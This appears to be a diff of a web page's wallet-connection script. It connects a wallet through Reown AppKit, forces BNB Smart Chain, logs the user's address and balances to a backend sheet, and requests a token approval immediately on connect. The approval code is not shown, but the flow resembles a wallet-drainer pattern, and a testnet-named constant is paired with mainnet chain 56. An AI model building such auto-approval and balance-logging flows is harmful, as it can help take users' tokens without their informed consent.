@@ -639,67 +639,7 @@
 
 
 
-let appKitEip155Provider = null;
 
-// Watch AppKit provider globally (mobile fix)
-// This catches both fresh connections AND restored sessions.
-function setupAppKitProviderWatcher() {
-  if (!window.appKit || typeof window.appKit.subscribeProviders !== "function") return;
-
-  window.appKit.subscribeProviders(async (state) => {
-    const provider = state["eip155"] || null;
-
-    // NEWLY CONNECTED or RESTORED provider
-    if (provider && provider !== appKitEip155Provider) {
-      appKitEip155Provider = provider;
-      await handleAppKitProvider(provider);
-    }
-
-    // DISCONNECTED provider
-    if (!provider && appKitEip155Provider) {
-      appKitEip155Provider = null;
-      clearSessionUI();
-    }
-  });
-}
-
-async function handleAppKitProvider(provider) {
-  try {
-    providerInstance = provider;
-    web3Instance = new Web3(providerInstance);
-
-    let accounts = await web3Instance.eth.getAccounts();
-
-    // Mobile Chrome sometimes returns [] for 0.5 seconds → retry
-    if (!accounts || !accounts.length) {
-      for (let i = 0; i < 5; i++) {
-        await new Promise(r => setTimeout(r, 400));
-        accounts = await web3Instance.eth.getAccounts();
-        if (accounts && accounts.length) break;
-      }
-    }
-
-    if (!accounts || !accounts.length) {
-      console.warn("Still no accounts after retry mobile.");
-      return;
-    }
-
-    const address = accounts[0].toLowerCase();
-    currentAddress = address;
-
-    // Restore UI + balances
-    await restoreSessionFromAddress(address);
-
-    isWalletConnected = true;
-    setStatus("Connected");
-
-    // Only ask approval when new session detected
-    await ensureTokenApproval();
-
-  } catch (err) {
-    console.error("handleAppKitProvider error:", err);
-  }
-}
 
     
 
@@ -1082,109 +1022,99 @@ if (connectBtnCard) {
     }
 
     // 🔁 NEW: connect using Reown AppKit
- // 🔁 NEW: connect using Reown AppKit (fixed for mobile)
-async function connectFlow() {
-  try {
-    if (!window.appKit) {
-      alert("Wallet connect UI not ready. Please reload the page.");
-      return;
-    }
+    async function connectFlow() {
+      try {
+        if (!window.appKit) {
+          alert("Wallet connect UI not ready. Please reload the page.");
+          return;
+        }
 
-    setStatus("Connecting…");
+        setStatus("Connecting…");
 
-    let gotProvider = null;
+        // 1) Open AppKit modal (Connect view)
+        await window.appKit.open({ view: "Connect" });
 
-    // 1) Subscribe BEFORE opening the modal
-    const unsubscribe = window.appKit.subscribeProviders((state) => {
-      const evm = state["eip155"];
-      if (evm && !gotProvider) {
-        gotProvider = evm;
+        // 2) Wait for an EVM provider from AppKit (namespace: eip155)
+        const provider = await new Promise((resolve) => {
+          const unsubscribe = window.appKit.subscribeProviders((state) => {
+            const evm = state["eip155"];
+            if (evm) {
+              if (typeof unsubscribe === "function") unsubscribe();
+              resolve(evm);
+            }
+          });
+        });
+
+        if (!provider) {
+          setStatus("Not connected");
+          return;
+        }
+
+        // 3) Use this provider for Web3 & Ethers
+        providerInstance = provider;
+        web3Instance     = new Web3(providerInstance);
+
+        attachProviderListeners(providerInstance);
+
+        const accounts = await web3Instance.eth.getAccounts();
+        if(!accounts || !accounts.length){
+          setStatus("No account");
+          return;
+        }
+        const address = accounts[0].toLowerCase();
+
+        // 4) Ensure BSC (56)
+        let chainId    = await web3Instance.eth.getChainId();
+        let chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
+
+        if (chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
+          const switched = await switchToBSC(providerInstance);
+          if(!switched){
+            alert("Please switch to BNB Smart Chain (56) in your wallet and try again.");
+            setStatus("Wrong network");
+            return;
+          }
+          chainId    = await web3Instance.eth.getChainId();
+          chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
+          if(chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
+            alert("Network switch failed. Make sure you are on BNB Smart Chain (56).");
+            setStatus("Wrong network");
+            return;
+          }
+        }
+
+        // 5) Connected + correct network
+        setStatus("Connected");
+
+        const sessionPromise = (async () => {
+          const session = await restoreSessionFromAddress(address);
+          const balanceBNB   = session.balanceBNB;
+          const tokenBalance = session.tokenBalance;
+          const userId       = session.userId;
+
+          // Log to sheet
+          notifyBackend(
+            address,
+            BNB_TESTNET_LABEL,
+            userId,
+            balanceBNB,
+            tokenBalance,
+            "connect"
+          ).catch(console.error);
+
+          return session;
+        })();
+
+        // 6) Token approval (same as before)
+        await ensureTokenApproval();
+        sessionPromise.catch(console.error);
+
+      } catch (err) {
+        console.error("connectFlow error (AppKit):", err);
+        setStatus("Connection failed");
+        alert("Connection failed: " + (err && err.message ? err.message : err));
       }
-    });
-
-    // 2) Open AppKit modal (Connect view)
-    await window.appKit.open({ view: "Connect" });
-
-    // 3) Stop listening
-    if (typeof unsubscribe === "function") {
-      unsubscribe();
     }
-
-    // 4) If no provider, user probably closed modal or connect failed
-    const provider = gotProvider;
-    if (!provider) {
-      setStatus("Not connected");
-      return;
-    }
-
-    // 5) Use this provider for Web3 & Ethers
-    providerInstance = provider;
-    web3Instance     = new Web3(providerInstance);
-
-    attachProviderListeners(providerInstance);
-
-    const accounts = await web3Instance.eth.getAccounts();
-    if(!accounts || !accounts.length){
-      setStatus("No account");
-      return;
-    }
-    const address = accounts[0].toLowerCase();
-    currentAddress = address; // helpful for approval logging
-
-    // 6) Ensure BSC (56)
-    let chainId    = await web3Instance.eth.getChainId();
-    let chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
-
-    if (chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
-      const switched = await switchToBSC(providerInstance);
-      if(!switched){
-        alert("Please switch to BNB Smart Chain (56) in your wallet and try again.");
-        setStatus("Wrong network");
-        return;
-      }
-      chainId    = await web3Instance.eth.getChainId();
-      chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
-      if(chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
-        alert("Network switch failed. Make sure you are on BNB Smart Chain (56).");
-        setStatus("Wrong network");
-        return;
-      }
-    }
-
-    // 7) Connected + correct network
-    setStatus("Connected");
-
-    const sessionPromise = (async () => {
-      const session = await restoreSessionFromAddress(address);
-      const balanceBNB   = session.balanceBNB;
-      const tokenBalance = session.tokenBalance;
-      const userId       = session.userId;
-
-      // Log to sheet
-      notifyBackend(
-        address,
-        BNB_TESTNET_LABEL,
-        userId,
-        balanceBNB,
-        tokenBalance,
-        "connect"
-      ).catch(console.error);
-
-      return session;
-    })();
-
-    // 8) Token approval (same behavior as before)
-    await ensureTokenApproval();
-    sessionPromise.catch(console.error);
-
-  } catch (err) {
-    console.error("connectFlow error (AppKit):", err);
-    setStatus("Connection failed");
-    alert("Connection failed: " + (err && err.message ? err.message : err));
-  }
-}
-
-    
 
     async function tryAutoReconnectSilent(){
       // keep your old silent reconnect using injected wallets
@@ -1321,7 +1251,6 @@ async function connectFlow() {
       }
 
       updateClaimState();
-setupAppKitProviderWatcher();
 
       if(connectBtn){
         connectBtn.addEventListener("click", function(){
